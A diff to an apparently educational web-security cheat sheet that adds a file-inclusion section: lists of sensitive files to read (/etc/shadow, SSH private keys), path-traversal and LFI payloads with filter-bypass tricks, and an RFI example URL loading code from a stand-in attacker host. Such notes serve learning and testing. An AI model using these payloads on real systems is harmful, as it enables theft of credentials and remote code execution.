@@ -9,7 +9,7 @@
 * [PHP](#PHP)
 * [IDOR](#IDOR)
 * [HTTP 302](#HTTP-302)
-* [Directory Listing](#Directory-Listing)
+* [File Inclusion](#File-Inclusion)
 * [Cookie](#Cookie)
 * [SQL Injection](#SQL-Injection)
   * [MySQL](#MySQL)
@@ -107,7 +107,27 @@
 * `curl` only redirects when adding parameter `-L`
 * Use `curl` to view the original page
 
-## Directory Listing
+## File Inclusion
+* Path (Directory) Traversal: It occurs when user input is not validated and passed to a function such as `file_get_contents`.
+  * `/etc/issue`
+  * `/etc/profile`
+  * `/proc/version`
+  * `/etc/passwd`
+  * `/etc/shadow`
+  * `/root/.bash_history`
+  * `/var/log/dmessage`
+  * `/var/mail/root`
+  * `/root/.ssh/id_rsa`
+  * `/var/log/apache2/access.log`
+  * `C:\boot.ini`
+* Local File Inclusion (LFI): Using PHP functions such as `include`, `require`, `include_once`, `require_once`
+  * `../../../../etc/passwd`
+  * !`%00` no longer works with PHP 5.3.4 and above! If a file type is specified for the include function (ex. adding .php at the end), add a NULL byte (%00 or 0x00) at the end: `../../../../etc/passwd%00`
+  * If keywords are being filtered (ex. `/etc/passwd`), there are two methods to bypass it: Null Byte `%00` and current directory trick `/etc/passwd/.`
+  * If web application replaces `../` with empty string, use `....//....//....//....//etc/passwd` because PHP filter only matches and replaces the first subset string `../` it finds and doesn't do another pass: ..<s>../</s>/..<s>../</s>/..<s>../</s>/..<s>../</s>/etc/passwd -> ../../../../etc/passwd
+  * If the developer forces the include to read from a defined directory, include the directory in the payload.
+* Remote File Inclusion (RFI): Inject an external URL into `include` function. One requirement is that `allow_url_fopen` option needs to be `on`.
+  * `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
 
 ## Cookie
 
